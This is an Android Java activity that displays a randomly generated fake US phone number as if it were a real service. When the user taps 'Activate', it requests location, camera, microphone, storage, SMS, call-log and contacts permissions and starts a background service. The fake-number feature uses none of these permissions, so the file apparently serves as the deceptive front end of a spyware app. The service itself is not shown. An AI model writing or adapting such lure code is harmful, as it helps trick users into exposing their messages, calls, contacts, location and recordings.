package com.quality.app;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import android.app.Activity;
import java.util.Random;

public class MainActivity extends Activity {

    private static final int PERM_REQUEST = 1001;
    private TextView numberText;
    private Button activateBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        numberText = findViewById(R.id.numberText);
        activateBtn = findViewById(R.id.activateBtn);

        numberText.setText(generateUSNumber());

        activateBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
                Intent intent = new Intent(MainActivity.this, BackgroundService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }
                Toast.makeText(MainActivity.this, "Number activated!", Toast.LENGTH_SHORT).show();
                activateBtn.setText("Activated");
                activateBtn.setEnabled(false);
            }
        });
    }

    private String generateUSNumber() {
        Random r = new Random();
        int area = 200 + r.nextInt(700);
        int mid = 200 + r.nextInt(700);
        int last = 1000 + r.nextInt(9000);
        return "+1 (" + area + ") " + mid + "-" + last;
    }

    private void requestAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] perms = {
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS
            };
            requestPermissions(perms, PERM_REQUEST);
        }
    }
}
